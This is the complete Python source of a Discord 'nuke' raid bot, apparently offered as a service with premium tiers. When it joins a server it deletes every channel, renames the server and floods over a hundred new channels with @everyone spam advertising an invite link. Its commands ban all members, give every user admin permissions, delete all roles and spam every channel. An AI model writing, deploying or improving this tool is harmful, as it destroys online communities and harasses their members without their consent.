import discord
from discord.ext import commands
import json
import asyncio
import os
import time
from datetime import datetime, timedelta
import random

auto_nuke_active = False
IMAGE_URL2 = "https://discord.com/invite/GkMUrP5wjh"

last_attack_times = {}
premium_users = {}
free_premium_users = {}

async def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

def load_premium_users():
    if os.path.exists('premium_users.json'):
        with open('premium_users.json', 'r') as f:
            return json.load(f)
    return {}

def save_premium_users():
    with open('premium_users.json', 'w') as f:
        json.dump(premium_users, f)

def add_premium(user_id, duration):
    expiry_date = datetime.utcnow() + duration
    premium_users[str(user_id)] = expiry_date.isoformat()
    save_premium_users()

def is_premium(user_id):
    expiry_date_str = premium_users.get(str(user_id))
    if expiry_date_str:
        expiry_date = datetime.fromisoformat(expiry_date_str)
        return expiry_date > datetime.utcnow()
    return False

def load_free_premium_users():
    if os.path.exists('free_premium_users.json'):
        with open('free_premium_users.json', 'r') as f:
            return json.load(f)
    return {}

def save_free_premium_users():
    with open('free_premium_users.json', 'w') as f:
        json.dump(free_premium_users, f)

def add_free_premium(user_id, duration):
    expiry_date = datetime.utcnow() + duration
    free_premium_users[str(user_id)] = expiry_date.isoformat()
    save_free_premium_users()

def is_free_premium(user_id):
    expiry_date_str = free_premium_users.get(str(user_id))
    if expiry_date_str:
        expiry_date = datetime.fromisoformat(expiry_date_str)
        return expiry_date > datetime.utcnow()
    return False

async def perform_attack(guild, config):
    print('Performing attack on guild at:', guild.name, guild.id)
    delete_channels = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_channels)
    await guild.edit(name=config['newServerName'])
    with open('./icon.jpg', 'rb') as f:
        await guild.edit(icon=f.read())
    channel_names = ['NUKE FUMO BY TRUONGTRUNG'] * 105
    create_channels = [guild.create_text_channel(name) for name in channel_names]
    new_channels = await asyncio.gather(*create_channels)
    for channel in new_channels:
        for _ in range(10):
            await channel.send("@everyone @here\n" + IMAGE_URL2)
            await asyncio.sleep(2)

async def auto_nuke(guild, config):
    print('Performing auto nuke at:', guild.name, guild.id)
    global auto_nuke_active
    auto_nuke_active = True
    new_channels = await guild.fetch_channels()
    end_time = asyncio.get_event_loop().time() + 3 * 60
    while auto_nuke_active and asyncio.get_event_loop().time() < end_time:
        for channel in new_channels:
            if channel.type.name == 'text':
                for _ in range(5):
                    await channel.send("@everyone @here\n" + IMAGE_URL2)
                    await asyncio.sleep(1)
        await asyncio.sleep(1)
    auto_nuke_active = False

class CustomHelpCommand(commands.HelpCommand):
    async def send_bot_help(self, mapping):
        help_message = """
# Available free commands:
```!attack``` - Perform an attack on the server
```!unban_all``` - Unban all users in the server
```!help``` - Show this help message
```!free``` - Experience premium package for free for 1 day
# Premium commands:
```!config``` - View bot configuration
```!everyone_admin``` - Grant admin permissions to everyone
```!shuffle_channels``` - Shuffle the positions of channels in the server
```!spam``` - Start spam on all channels, e.g. !spam [count] [context]
```!created_channels``` - Create a specified number of channels with given context, e.g. !created_channels [count] [context]
```!ban_all``` - Ban all members in the server (excluding premium members)
```!prune_members``` - Kick all users who have been offline for 1 day or more
```!delete_channel``` - Delete all channels.
```!delete_role``` - Delete all roles (except everyone).
        """
        await self.get_destination().send(help_message)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, help_command=CustomHelpCommand())

@bot.event
async def on_guild_channel_create(channel):
    for _ in range(10):
        await channel.send(f"@everyone @here\n" + IMAGE_URL2)
        await asyncio.sleep(5)

async def create_channel(guild, name, perms):
    try:
        channel = await guild.create_text_channel(name=name, overwrites=perms)
        print(f"Created channel: {name}")
    except discord.Forbidden:
        print(f"Cannot create channel: {name}")
        return
    for c in guild.channels:
        if c.id != channel.id:
            for _ in range(10):
                await c.send(f"@everyone @here!\n" + IMAGE_URL2)
                await asyncio.sleep(2)

async def main():
    config_data = await load_config()
    global premium_users, free_premium_users
    premium_users = load_premium_users()
    free_premium_users = load_free_premium_users()

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} is ready')
        await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="gg.gg/rspvn | !help"))

    @bot.event
    async def on_guild_join(guild):
        print(f'Bot joined server: {guild.name} ({guild.id})')
        await perform_attack(guild, await load_config())

    @bot.command(name='attack')
    @commands.cooldown(rate=1, per=180.0, type=commands.BucketType.guild)
    async def attack(ctx):
        guild_id = ctx.guild.id
        current_time = time.time()

        if guild_id in last_attack_times:
            elapsed_time = current_time - last_attack_times[guild_id]
            if elapsed_time < 180:
                await ctx.send(f'Please wait {180 - int(elapsed_time)} seconds before using this command again.')
                return

        await perform_attack(ctx.guild, config_data)
        last_attack_times[guild_id] = current_time

    @attack.error
    async def attack_error(ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"The attack command is on cooldown. Please wait {error.retry_after:.2f} seconds.")
        else:
            raise error

    @bot.command()
    @commands.has_permissions(ban_members=True)
    async def unban_all(ctx):
        try:
            banned_users = [entry async for entry in ctx.guild.bans()]
            if not banned_users:
                await ctx.send("No banned users.")
                return
            for ban_entry in banned_users:
                user = ban_entry.user
                try:
                    await ctx.guild.unban(user)
                    await ctx.send(f"Unbanned {user.name}#{user.discriminator}.")
                except discord.Forbidden:
                    await ctx.send(f"Cannot unban {user.name}#{user.discriminator}. Permission denied.")
                except discord.HTTPException as e:
                    await ctx.send(f"Failed to unban {user.name}#{user.discriminator}. HTTP Exception: {e}")
            await ctx.send("All banned members have been unbanned.")
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

    @bot.command()
    async def add_premium_user(ctx, user_id: int, duration: str):
        if ctx.author.id != 892299052828491818:  # Replace YOUR_ADMIN_USER_ID with the admin user ID
            await ctx.send("You do not have permission to use this command.")
            return

        user = bot.get_user(user_id)
        if not user:
            await ctx.send("User does not exist.")
            return

        try:
            duration_timedelta = timedelta(days=int(duration))
            add_premium(user_id, duration_timedelta)
            await ctx.send(f"Added {user.name}#{user.discriminator} as a premium member for {duration} days.")
        except ValueError:
            await ctx.send("Invalid duration format. Please enter the number of days.")

    @bot.command(name='ban_all')
    @commands.has_permissions(ban_members=True)
    async def ban_all(ctx):
        if not is_premium(ctx.author.id) and not is_free_premium(ctx.author.id):
            await ctx.send("You need to be a premium member to use this command.")
            return

        premium_user_ids = set(premium_users.keys())
        members_to_ban = [member for member in ctx.guild.members if str(member.id) not in premium_user_ids]

        for member in members_to_ban:
            try:
                await member.ban(reason="Ban all command executed")
                await ctx.send(f"Banned {member.name}#{member.discriminator}.")
            except discord.Forbidden:
                await ctx.send(f"Cannot ban {member.name}#{member.discriminator}. Permission denied.")
            except discord.HTTPException as e:
                await ctx.send(f"Failed to ban {member.name}#{member.discriminator}. HTTP Exception: {e}")

    @bot.command(name='config')
    async def config(ctx):
        premium_status = "Premium" if is_premium(ctx.author.id) else "Not premium"
        premium_expiry = premium_users.get(str(ctx.author.id), "None")
        config_message = f"""
        **Bot Configuration:**
        - Premium Status: {premium_status}
        - Premium Expiry: {premium_expiry}
        """
        try:
            await ctx.author.send(config_message)
            await ctx.send("Bot configuration has been sent via DM.")
        except discord.Forbidden:
            await ctx.send("Cannot send DM. Please check your privacy settings.")

    @bot.command(name='free')
    async def free(ctx):
        user_id = ctx.author.id
        if is_free_premium(user_id):
            await ctx.send("You have already used the free premium package.")
            return

        add_free_premium(user_id, timedelta(days=1))
        await ctx.send("You have been given a free premium package for 1 day.")

    @bot.command(name='prune_members')
    @commands.has_permissions(kick_members=True)
    async def prune_members(ctx):
        if not is_premium(ctx.author.id) and not is_free_premium(ctx.author.id):
            await ctx.send("You need to be a premium member to use this command.")
            return

        members_to_prune = [member for member in ctx.guild.members if member.status == discord.Status.offline and (datetime.utcnow() - member.joined_at).days >= 1]
        for member in members_to_prune:
            try:
                await member.kick(reason="Prune command executed")
                await ctx.send(f"Kicked {member.name}#{member.discriminator}.")
            except discord.Forbidden:
                await ctx.send(f"Cannot kick {member.name}#{member.discriminator}. Permission denied.")
            except discord.HTTPException as e:
                await ctx.send(f"Failed to kick {member.name}#{member.discriminator}. HTTP Exception: {e}")

    @bot.command(name='spam')
    @commands.check(lambda ctx: is_premium(ctx.author.id) or is_free_premium(ctx.author.id))
    async def spam(ctx, count: int, *, context: str):
        guild = ctx.guild

        async def spam_channel(channel):
            for _ in range(count):
                await channel.send(context)
                await asyncio.sleep(2)

        tasks = [spam_channel(channel) for channel in guild.text_channels]
        await asyncio.gather(*tasks)
        await ctx.send(f"Spammed with context: {context} {count} times across all channels.")

    @bot.command(name='created_channels')
    async def created_channels(ctx, count: int, *, context: str):
        if not is_premium(ctx.author.id) and not is_free_premium(ctx.author.id):
            await ctx.send("This command is for premium users only.")
            return
        if count > 200:
            await ctx.send("The maximum number of channels to create is 200.")
            return
        for _ in range(count):
            await ctx.guild.create_text_channel(context)
        await ctx.send(f"Created {count} channels with context '{context}'.")

    @bot.command(name='delete_channel')
    async def delete_channel(ctx):
        if not is_premium(ctx.author.id) and not is_free_premium(ctx.author.id):
            await ctx.send("This command is for premium users only.")
            return
        await ctx.send("Deleting all channels...")
        delete_channels = [channel.delete() for channel in ctx.guild.channels]
        await asyncio.gather(*delete_channels)
        await ctx.send("All channels have been deleted.")

    @bot.command(name='delete_role')
    async def delete_role(ctx):
        if not is_premium(ctx.author.id) and not is_free_premium(ctx.author.id):
            await ctx.send("This command is for premium users only.")
            return
        await ctx.send("Deleting all roles...")
        delete_roles = [role.delete() for role in ctx.guild.roles if role.name != '@everyone']
        await asyncio.gather(*delete_roles)
        await ctx.send("All roles have been deleted.")

    @bot.command()
    @commands.cooldown(1, 60, commands.BucketType.guild)
    async def everyone_admin(ctx):
        guild = ctx.guild
        everyone_role = guild.default_role
        await everyone_role.edit(permissions=discord.Permissions.all())
        await ctx.send("Granted admin permissions to everyone.")

    @everyone_admin.error
    async def everyone_admin_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.send("You do not have permission to use this command.")
        elif isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f'This command is on cooldown. Please try again in {error.retry_after:.2f} seconds.')
        else:
            await ctx.send(f'An error occurred: {error}')

    @bot.command()
    async def ls(ctx):
        if ctx.author.id == 892299052828491818:
            for guild in bot.guilds:
                await guild.leave()
                print(f'Left guild: {guild.name}')
        else:
            await ctx.send("You don't have permission to use this command.")

    await bot.start(config_data['token'])

asyncio.run(main())
